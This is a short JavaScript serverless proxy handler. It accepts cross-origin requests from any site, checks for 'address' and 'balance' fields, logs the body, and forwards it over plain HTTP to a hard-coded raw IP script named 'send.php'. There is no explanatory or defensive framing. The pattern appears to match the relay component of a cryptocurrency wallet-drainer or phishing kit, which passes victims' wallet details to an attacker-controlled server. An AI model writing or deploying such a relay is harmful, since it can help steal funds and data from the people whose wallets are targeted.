export default async function handler(req, res) {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");

    if (req.method === "OPTIONS") {
        res.status(200).end();
        return;
    }

    try {
        console.log("🔍 Incoming Request to Proxy:", JSON.stringify(req.body, null, 2));

        if (!req.body || !req.body.address || !req.body.balance) {
            console.error("❌ Error: Missing required fields in request.");
            return res.status(400).json({ error: "Missing required fields" });
        }

        const response = await fetch("http://104.194.133.124/send.php", {
            method: req.method,
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(req.body),
        });

        const data = await response.text();

        console.log("🔍 Response from Backend:", data);

        res.status(response.status).send(data);
    } catch (error) {
        console.error("❌ Error in Proxy:", error);
        res.status(500).json({ error: "Internal Server Error" });
    }
}
